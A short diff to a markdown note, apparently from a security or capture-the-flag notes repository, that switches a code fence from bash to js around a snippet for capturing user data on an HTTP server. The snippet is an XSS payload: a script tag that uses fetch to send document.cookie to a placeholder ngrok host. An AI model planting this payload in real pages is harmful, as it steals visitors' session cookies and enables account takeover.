@@ -1,6 +1,6 @@
 ## info
 http server capture user data by either sending the data in a query or in the body
-```bash
+```js
   <script>
       fetch(`https://NGROK-URL?cookie=${encodeURIComponent(document.cookie)}`)
   </script>
